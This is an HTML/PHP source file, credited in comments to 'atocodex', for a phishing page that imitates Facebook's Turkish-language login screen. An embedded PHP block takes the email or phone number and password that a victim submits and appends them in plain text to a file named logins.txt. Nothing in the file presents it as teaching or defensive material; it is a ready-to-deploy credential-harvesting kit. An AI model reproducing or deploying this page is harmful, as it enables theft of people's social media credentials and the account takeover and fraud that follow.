<! -- atocodex tarafından geliştirildi. -->
<! -- developed by atocodex -->
<! -- atocodexten sanala -->
<! -- atocann -->
<! -- eskiyaxd -->

  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <main>
        <div class="row">
            <div class="col-logo">
                <img src="fb_logo.svg" alt="Logo">
                <h2>Facebook tanıdıklarınla iletişim kurmanı ve hayatında olup bitenleri paylaşmanı sağlar.</h2>
            </div>
            <div class="col-form">
                <div class="form-container">
                    <form action="#"  method="POST">
                    <input type="text" name="name" placeholder="Eposta veya Telefon Numarası">
                    <input type="password" name="mail" placeholder="Şifre">
                   <input type="submit" name="submit" value="Giriş Yap" style="background-color:#1877f2;color:white;"></input>
                    <a href="#">Şifreni mi Unuttun?</a>
                    <button class="btn-new">Yeni Hesap Oluştur</button>
                </form>
                </div>
                <p><a href="#"><b>Ünlü biri,</b></a> marka veya işletme için Sayfa oluştur.</p>
            </div>
        </div>
    </main>




    <?php

if(isset($_POST['submit']))
{
$name=$_POST['name'];
$mail=$_POST['mail'];

$yaz = "Eposta: ".$name."\nŞifre: ".$mail."\n\n";


$fp = fopen('logins.txt', 'a');


fwrite($fp, $yaz);
fclose($fp);
}

?>





    <footer>
        <div class="footer-contents">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">മലയാളം</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><button>+</button></li>
            </ol>

            <ol>
                <li><a href="#">Kaydol</a></li>
                <li><a href="#">Giriş Yap </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
            </ol>
            <small>Facebook © 2022</small>
        </div>
    </footer>
</body>

</html>

<! -- atocodex tarafından geliştirildi. -->
<! -- developed by atocodex -->
<! -- atocodexten sanala -->
<! -- atocann -->
<! -- eskiyaxd -->